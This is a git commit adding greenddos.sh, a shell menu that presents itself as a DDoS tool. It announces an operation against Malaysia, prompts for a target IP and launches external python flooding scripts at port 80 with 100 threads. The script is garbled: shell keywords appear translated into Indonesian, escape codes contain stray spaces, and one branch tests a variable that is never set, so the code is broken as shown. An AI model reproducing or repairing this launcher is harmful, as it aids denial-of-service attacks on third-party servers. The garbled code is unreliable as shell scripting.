808da6ac42dbfad80a04c917f90a6603534b0128
greenzombies123 <52916652+greenzombies123@users.noreply.github.com>
2019-08-21 09:10:33 +0700

    Add files via upload

---
+++ greenddos.sh
@@ -0,0 +1,47 @@
+hijau = ' \ 033 [34; 1 m '
+hijau = ' \ 033 [32; 1 m '  
+hijau = ' \ 033 [35; 1 m '
+blue = ' \ 033 [36; 1m '
+red = ' \ 033 [31; 1m '
+white = ' \ 033 [37; 1m '                                           
+kuning = ' \ 033 [33; 1 m '
+bersih
+toilet -t miring "GREEN ZOMBIES "  | lolcat
+gema
+gema
+echo  $ red " --------------------------------------- "
+echo  $ red " GREE ZOMBIES HACKER "
+echo  $ red " DDOS "
+echo  $ red " THANKS TO MY TEAM "
+echo  $ red " --------------------------------------- "
+echo  $ green " DOS WIN32,64 NT DAN ANDROMEDA          "
+echo  $ green "       OP KHUSUS GAYANG MALAYSIA         "
+echo  $ green " --------------------------------------- "
+echo  $ red "                  LIST "
+echo  $ green " --------------------------------------- "
+echo  $ blue " [1] .TROJAN WIN32,64.NT "
+echo  $ blue " [2] .ANDROMEDA XR "
+echo  $ green " --------------------------------------- "
+echo  $ red " SILAHKAN DI PILIH "
+baca -p " PILIH >> ==> " guys ;
+gema
+if [ $ guys  = 1] || [ $ guys  = 1]
+kemudian
+bersih
+toilet -f miring " WIN32 "  | lolcat
+echo  $ green " MASUKAN IP TARGET "
+baca -p " ===> " ipt
+bersih
+gema
+python win.32.64.NT.py -s $ ipt -p80 -t100
+fi
+
+if [ $ bro  = 2] || [ $ bro  = 2]
+kemudian
+toilet -t miring " DROID RX "  | lolcat
+echo  $ green " MASUKAN IP TARGET "
+baca -p " ===> " ipt
+bersih
+gema
+python andromeda.py -s $ ipt -p80 -t100
+fi
